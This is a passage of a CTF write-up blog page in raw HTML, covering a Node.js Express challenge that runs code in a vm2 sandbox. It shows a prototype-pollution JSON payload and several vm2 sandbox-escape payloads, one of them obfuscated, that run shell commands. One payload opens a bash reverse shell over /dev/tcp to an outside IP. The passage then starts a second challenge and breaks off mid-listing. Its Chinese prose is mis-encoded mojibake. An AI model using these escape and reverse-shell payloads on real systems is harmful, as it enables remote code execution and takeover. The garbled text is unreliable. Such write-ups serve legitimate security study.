class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å­¦ä¹ ä¸€ä¸‹ç›¸å…³çŸ¥è¯†</p>
<h3 id="å†…ç½®æ¨¡å—çš„å‡½æ•°-1"><a href="#å†…ç½®æ¨¡å—çš„å‡½æ•°-1" class="headerlink" title="å†…ç½®æ¨¡å—çš„å‡½æ•°"></a>å†…ç½®æ¨¡å—çš„å‡½æ•°</h3><ol>
<li><p><strong><code>require()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>require()</code>å‡½æ•°ç”¨äºåŠ è½½Node.jsæ¨¡å—æˆ–æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ<code>require(&#39;express&#39;)</code>åŠ è½½äº†Expressæ¡†æ¶ï¼Œä½¿ä½ èƒ½å¤Ÿä½¿ç”¨å…¶æä¾›çš„åŠŸèƒ½ã€‚</p>
</li>
<li><p><strong><code>console.log()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br></pre></td></tr></table></figure>

<p><code>console.log()</code>æ˜¯Node.jsä¸­ç”¨äºåœ¨æ§åˆ¶å°è¾“å‡ºä¿¡æ¯çš„å‡½æ•°ï¼Œå®ƒé€šå¸¸ç”¨äºè°ƒè¯•ç›®çš„ã€‚</p>
</li>
<li><p><strong><code>JSON.parse()</code> å’Œ <code>JSON.stringify()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br></pre></td></tr></table></figure>

<p><code>JSON.parse()</code>ç”¨äºå°†JSONæ ¼å¼çš„å­—ç¬¦ä¸²è½¬æ¢æˆJavaScriptå¯¹è±¡ï¼Œè€Œ<code>JSON.stringify()</code>åˆ™å°†JavaScriptå¯¹è±¡è½¬æ¢æˆJSONå­—ç¬¦ä¸²ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ<code>JSON.stringify(req.body)</code>å°†è¯·æ±‚ä½“è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œç„¶å<code>JSON.parse()</code>åˆå°†å…¶è½¬æ¢å›å¯¹è±¡ï¼Œä½†è¿™å®é™…ä¸Šæ˜¯ä¸å¿…è¦çš„ï¼Œå› ä¸º<code>req.body</code>å·²ç»æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚</p>
</li>
<li><p><strong><code>app.listen()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>app.listen()</code>æ˜¯Expressæ¡†æ¶ä¸­çš„æ–¹æ³•ï¼Œç”¨äºå¯åŠ¨HTTPæœåŠ¡å™¨å¹¶ç›‘å¬ç‰¹å®šçš„ç«¯å£ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒæœåŠ¡å™¨å°†åœ¨3000ç«¯å£ä¸Šç›‘å¬ã€‚</p>
</li>
</ol>
<h3 id="Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°-1"><a href="#Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°-1" class="headerlink" title="Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°"></a>Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°</h3><ol>
<li><p><strong><code>app.use()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br></pre></td></tr></table></figure>

<p><code>app.use()</code>æ˜¯Expressçš„ä¸­é—´ä»¶æ³¨å†Œå‡½æ•°ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒæ³¨å†Œäº†ä¸€ä¸ªJSONè§£æä¸­é—´ä»¶ï¼Œä½¿å¾—æœåŠ¡å™¨èƒ½å¤Ÿè§£æJSONæ ¼å¼çš„POSTè¯·æ±‚ä½“ã€‚</p>
</li>
<li><p><strong><code>app.get()</code> å’Œ <code>app.post()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>è¿™äº›æ–¹æ³•ç”¨äºå®šä¹‰è·¯ç”±å¤„ç†å‡½æ•°ã€‚<code>app.get()</code>å®šä¹‰äº†å¤„ç†GETè¯·æ±‚çš„è·¯ç”±ï¼Œ<code>app.post()</code>å®šä¹‰äº†å¤„ç†POSTè¯·æ±‚çš„è·¯ç”±ã€‚<code>req</code>å‚æ•°æ˜¯è¯·æ±‚å¯¹è±¡ï¼ŒåŒ…å«äº†å®¢æˆ·ç«¯å‘é€çš„æ‰€æœ‰ä¿¡æ¯ï¼›<code>res</code>å‚æ•°æ˜¯å“åº”å¯¹è±¡ï¼Œç”¨äºå‘å®¢æˆ·ç«¯å‘é€æ•°æ®ã€‚</p>
</li>
</ol>
<h3 id="è‡ªå®šä¹‰å‡½æ•°-1"><a href="#è‡ªå®šä¹‰å‡½æ•°-1" class="headerlink" title="è‡ªå®šä¹‰å‡½æ•°"></a>è‡ªå®šä¹‰å‡½æ•°</h3><ol>
<li><p><strong><code>backdoor()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°å°è¯•åœ¨ä¸€ä¸ªæ²™ç®±ç¯å¢ƒä¸­è¿è¡Œæ½œåœ¨çš„æ¶æ„ä»£ç ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„æ“ä½œï¼Œå› ä¸ºå®ƒå¯èƒ½å…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
</li>
<li><p><strong><code>isObject()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦æ˜¯æ™®é€šçš„JavaScriptå¯¹è±¡ã€‚</p>
</li>
<li><p><strong><code>merge()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ç”¨äºåˆå¹¶ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœå¯¹è±¡ä¸­æœ‰åµŒå¥—çš„å¯¹è±¡ï¼Œå®ƒä¼šé€’å½’åœ°è¿›è¡Œåˆå¹¶ã€‚</p>
</li>
<li><p><strong><code>clone()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ·±æ‹·è´ï¼Œä½¿ç”¨<code>merge()</code>å‡½æ•°å®ç°ã€‚</p>
</li>
</ol>
<p>ä¼ å…¥ä¸€ä¸ªjsonæ•°æ®ï¼Œç»è¿‡json.parseå‡½æ•°è§£æï¼Œå†é€šè¿‡clone()å‡½æ•°å¤åˆ¶åˆ°copybodyä¸­</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722090830557.png" alt="image-20240722090830557"></p>
<p>vm2ä¼šæ‰§è¡Œshellcodeå±æ€§é‡Œé¢çš„å†…å®¹ï¼Œæˆ‘ä»¬éœ€è¦å°†è¯¥å±æ€§æ±¡æŸ“æˆvm2æ²™ç®±é€ƒé€¸çš„payloadå³å¯æ‰§è¡Œå‘½ä»¤ï¼Œexp</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;shit&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;shellcode&quot;</span><span class="punctuation">:</span><span class="string">&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(&#x27; + function()<span class="punctuation">&#123;</span></span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	try<span class="punctuation">&#123;</span></span><br><span class="line">		Object.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	<span class="punctuation">&#125;</span>catch(e)<span class="punctuation">&#123;</span></span><br><span class="line">		return e.get_process(()=&gt;<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>+&#x27;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(&#x27; + function()<span class="punctuation">&#123;</span></span><br><span class="line">	try<span class="punctuation">&#123;</span></span><br><span class="line">		Buffer.from(new Proxy(<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">			getOwnPropertyDescriptor()<span class="punctuation">&#123;</span></span><br><span class="line">				throw f=&gt;f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span>));</span><br><span class="line">	<span class="punctuation">&#125;</span>catch(e)<span class="punctuation">&#123;</span></span><br><span class="line">		return e(()=&gt;<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>+&#x27;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(function ()<span class="punctuation">&#123;</span></span><br><span class="line">    TypeError<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`prototyp`<span class="punctuation">&#125;</span>e`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span><span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`get_proces`<span class="punctuation">&#125;</span>s`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span> = f=&gt;f<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`constructo`<span class="punctuation">&#125;</span>r`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span>(`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`return this.proces`<span class="punctuation">&#125;</span>s`<span class="punctuation">&#125;</span>`)();</span><br><span class="line">    try<span class="punctuation">&#123;</span></span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = <span class="number">1</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span>catch(e)<span class="punctuation">&#123;</span></span><br><span class="line">        return e<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`get_proces`<span class="punctuation">&#125;</span>s`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span>(()=&gt;<span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>).mainModule<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`requir`<span class="punctuation">&#125;</span>e`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span>(`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`child_proces`<span class="punctuation">&#125;</span>s`<span class="punctuation">&#125;</span>`)<span class="punctuation">[</span>`$<span class="punctuation">&#123;</span>`$<span class="punctuation">&#123;</span>`exe`<span class="punctuation">&#125;</span>cSync`<span class="punctuation">&#125;</span>`<span class="punctuation">]</span>(`cat /flag`).toString();</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>)()</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å›æ˜¾ï¼Œåæ–œæ è½¬ä¹‰ï¼Œbashé‡Œé¢å•å¼•å·ä¸è¡Œå°±æ¢åŒå¼•å·</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;shit&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;shellcode&quot;</span><span class="punctuation">:</span><span class="string">&quot;let res = import(&#x27;./app.js&#x27;);res.toString.constructor(\&quot;return this\&quot;)().process.mainModule.require(\&quot;child_process\&quot;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/101.37.27.18/4444 0&gt;&amp;1\&quot;&#x27;).toString();&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722092054164.png" alt="image-20240722092054164"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722092115217.png" alt="image-20240722092115217"></p>
<h2 id="è¥¿æ¹–è®ºå‰‘-2022-real-ez-node-1"><a href="#è¥¿æ¹–è®ºå‰‘-2022-real-ez-node-1" class="headerlink" title="[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node"></a>[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node</h2><p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722093816221.png" alt="image-20240722093816221"></p>
<p>app.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);<span class="comment">//è§£æ,ç”¨req.bodyè·å–postå‚æ•°</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  secret : <span class="string">&#x27;secret&#x27;</span>, <span class="comment">// å¯¹session id ç›¸å…³çš„cookie è¿›è¡Œç­¾å</span></span><br><span class="line">  resave : <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>, <span class="comment">// æ˜¯å¦ä¿å­˜æœªåˆå§‹åŒ–çš„ä¼šè¯</span></span><br><span class="line">  cookie : &#123;</span><br><span class="line">    maxAge : <span class="number">1000</span> * <span class="number">60</span> * <span class="number">3</span>, <span class="comment">// è®¾ç½® session çš„æœ‰æ•ˆæ—¶é—´ï¼Œå•ä½æ¯«ç§’</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="comment">// app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123;    // è®¾ç½®ä½¿ç”¨ ejs æ¨¡æ¿å¼•æ“ </span></span><br><span class="line"><span class="comment">//   fs.readFile(filePath, (err, content) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//       if (err) return callback(new Error(err))</span></span><br><span class="line"><span class="comment">//       let compiled = lodash.template(content)    // ä½¿ç”¨ lodash.template åˆ›å»ºä¸€ä¸ªé¢„ç¼–è¯‘æ¨¡æ¿æ–¹æ³•ä¾›åé¢ä½¿ç”¨</span></span><br><span class="line"><span class="comment">//       let rendered = compiled()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//       return callback(null, rendered)</span></span><br><span class="line"><span class="comment">//   &#125;)</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, index);</span><br><span class="line"><span class="comment">// app.use(&#x27;/challenge7&#x27;, challenge7);</span></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">message</span> = err.<span class="property">message</span>;</span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">error</span> = req.<span class="property">app</span>.<span class="title function_">get</span>(<span class="string">&#x27;env&#x27;</span>) === <span class="string">&#x27;development&#x27;</span> ? err : &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.<span class="title function_">status</span>(err.<span class="property">status</span> || <span class="number">500</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app;</span><br></pre></td></tr></table></figure>

<p>index.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 